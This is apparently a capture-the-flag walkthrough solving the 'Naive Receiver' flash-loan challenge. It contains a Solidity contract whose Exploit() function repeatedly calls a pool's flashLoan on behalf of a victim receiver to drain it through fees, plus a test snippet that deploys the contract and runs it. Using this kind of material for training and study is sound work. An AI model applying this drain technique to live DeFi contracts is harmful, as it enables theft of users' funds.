create a new file in side **`contracts/naive-receiver`** called **`NaiveReceiver_SolutionCode.sol`** 

``` solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract NaiveReceiver_SolutionCode
{
    // Constant variables
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant Amount = 1 ether; 

    // Immutable variables
    IERC3156FlashLender private immutable pool;
    IERC3156FlashBorrower private immutable receiver;

    // constructor
    constructor(address _pool, address _receiver) 
    {
        pool = IERC3156FlashLender(_pool);
        receiver = IERC3156FlashBorrower(_receiver);
    }

    
    function Exploit() external
    {
        for (uint i = 0; i < 10; i++) 
        {
            pool.flashLoan(receiver, ETH, Amount, "0x");    
        }
    }
}
``` 
Your contracts will be compiled, when you run the test.


Then you can go to test file And use this code:
```js
// test/naive-receiver/naive-receiver.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
               
    
        //Location of your compiled contract data. If you are fallowing this solition, copy bellow
        const compiled_data = require("../../artifacts/contracts/naive-receiver/NaiveReceiver_SolutionCode.sol/NaiveReceiver_SolutionCode.json");

        const abi = compiled_data.abi;
        const bytecode = compiled_data.bytecode;
    
        const factory = new ethers.ContractFactory(abi, bytecode, deployer);

        const NaiveReceiver_SolutionCode = await factory.deploy(pool.address, receiver.address)

        await NaiveReceiver_SolutionCode.Exploit();
    });

```
